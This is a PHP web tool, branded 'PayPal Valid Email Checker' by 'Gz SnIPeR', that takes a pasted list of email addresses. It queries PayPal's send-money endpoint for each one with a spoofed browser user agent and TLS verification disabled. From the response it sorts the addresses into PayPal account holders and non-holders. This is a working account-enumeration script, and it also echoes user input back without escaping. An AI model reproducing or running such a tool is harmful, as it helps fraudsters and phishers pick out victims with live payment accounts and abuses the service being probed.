<?php
@set_time_limit(0);

function curl($url='',$var='',$Follow=False){
    global $set;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,20);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31');
    curl_setopt($curl, CURLOPT_COOKIE,'PP1.txt');
    curl_setopt($curl, CURLOPT_COOKIEFILE,'PP1.txt');
    curl_setopt($curl, CURLOPT_COOKIEJAR,'PP1.txt');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 3);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
	if ($Follow !== False) {
	curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
	}
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
echo "<head>
<style type=\"text/css\"><!--
	body {
	
	font-family: 'Open Sans', sans-serif; font-size:13px}
	hr {border:inset 1px #E5E5E5}
	#form-container 
	{
		border: solid 1px #ddd;
		border-radius:10px;
		-moz-border-radius: 10px;
		-webkit-border-radius: 10px;
		box-shadow: 0px 0px 15px #888;
		-moz-box-shadow: 0px 0px 15px #888;
		-webkit-box-shadow: 0px 0px 15px #888;
		margin:30px auto;
		padding:10px;
		width:910px;
		text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
	}
	
	
	
		#form-container1 
	{
		border: solid 1px #ddd;
		border-radius:10px;
		-moz-border-radius: 10px;
		-webkit-border-radius: 10px;
		box-shadow: 0px 0px 15px #888;
		-moz-box-shadow: 0px 0px 15px #888;
		-webkit-box-shadow: 0px 0px 15px #888;
		margin:30px auto;
		padding:10px;
		width:280px;
		text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
	}
	
	
	input[type=text], textarea
	{
		background:#fff;
		border:solid 1px #E5E5E5; 
		border-radius:5px;
		-moz-border-radius: 5px; 
		-webkit-border-radius: 5px;
	}
	textarea { width:100%;height:200px; resize:none }
	input[type=text] { width:160px;text-align:center }
	input[type=text]:focus, textarea:focus { background:#EDF3FC; border:solid 1px #D5E3F9; }
	.submit-button 
	{ 
		background: #57A02C;
		border:solid 1px #57A02C;
		border-radius:5px;
			-moz-border-radius: 5px; 
			-webkit-border-radius: 5px;
		-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
		-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
		text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
		border-bottom: 1px solid rgba(0,0,0,0.25);
		position: relative;
		color:#FFF;
		display: inline-block; 
		cursor:pointer;
		font-size:13px;
		padding:3px 8px;
	}
	.submit-button:hover { background:#82D051;border:solid 1px #86CC50; }
	.table
	{
		border: solid 1px #ddd;
		border-radius:10px;
		-moz-border-radius: 5px;
		-webkit-border-radius: 5px;
		padding-left:10px;
	}
	
	.unverified
	{
		color:#800000;
		font-weight: bold;	
	}
	.business{
		color:yellow;
		font-weight: bold;
	}
	.premier{
		color:#00FF00;
		font-weight: bold;
	}
	.verified{
		color:#800080;
		font-weight: bold;
	}
	.nolog{
		font-size: 10px;
		font: red;
	}


--></style>
<title>Valid Email Checker By Gz SnIPeR</title>
</head><div align=\"center\"></center>";

$emails = $_POST['emails'];
print '<div id="form-container"> <form method="POST">

<p align="center"><font face="Times New Roman" size="6">PayPal Valid Email 
Checker<br>
Gz SnIPeR</font></p>

	<p><textarea rows="10" name="emails" cols="48">'.$emails.'</textarea></p>
	<p><input class="submit-button" type="submit" value="Submit" name="B1"></p>
</form> </div>';
if (!empty($emails)) {
$emails = explode("\r\n", $emails);
$yes = 0;
$not = 0;
$inv = 0;
$count = 1;
print "<p align=\"left\">Checking <font color=\"#000000\"> <b>".count($emails)."</b></font> emails ....<br></p><p align=\"left\">";
foreach ( $emails as $email ) {
    $email = trim($email);
    print $count .". Checking <b><font color=\"#000000\">".$email."</font>  ..... </b>";
    $count++;
    if(filter_var($email, FILTER_VALIDATE_EMAIL)){
$_CheckAction = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_send-money&myAllTextSubmitID=&cmd=_send-money&type=external&payment_source=p2p_mktgpage&payment_type=Gift&sender_email='.$email.'&email=gz%40s.com&currency=USD&amount=10&amount_ccode=USD&submit.x=Continue',CURLOPT_FAILONERROR,TRUE);
			if(!strpos($_CheckAction, "region")) {
				print "<font size=\"3\" color=\"#006600\">Yes</font> <br>";
				$yes++;
				$vaild_yes .=$email."\n";
			}
		else {
			print "<font color=\"#FF0000\">NO</font><br>";
			$not++;
			$vaild_no .=$email."\n";
		}
	}
	else {
		print "<font color=\"#FF0000\">Invaild email</font><br>";
		$inv++;
		$invaild .=$email."\n";
}
}

print '<p><table border="0" width="100%">
	



         <tr>
		<td><p align="center"><font face="Times New Roman" size="4">PayPal emails</font> <b>(<font color="#006600"><b>'.$yes.'</b></font>)</b> </p></td>
		<td><p align="center"><font face="Times New Roman" size="4">Not PayPal emails</font> <b>(<font color="#FF0000">'.$not.'</font>)</b> </p> </td>
		<td><p align="center"><font face="Times New Roman" size="4">Invalid emails</font> <b>(<font color="#FF0000">'.$inv.'</font>)</b> </p> </td>
</tr>

	<tr>

	
	
	
	  	<td><div id="form-container1"><textarea rows="10" name="S1" cols="43">'.$vaild_yes.'</textarea></div></td>
		<td><div id="form-container1"><textarea rows="10" name="S2" cols="43">'.$vaild_no.'</textarea></div></td>
		<td><div id="form-container1"><textarea rows="10" name="S3" cols="43">'.$invaild.'</textarea></div></td>
	</tr>
</table></p>';
}

?><p>&nbsp;</p>
	<p>Copyright ©&nbsp; <span class="auto-style8">2013 </span></p>
	<p><span class="auto-style8">Gz SnIPeR</span>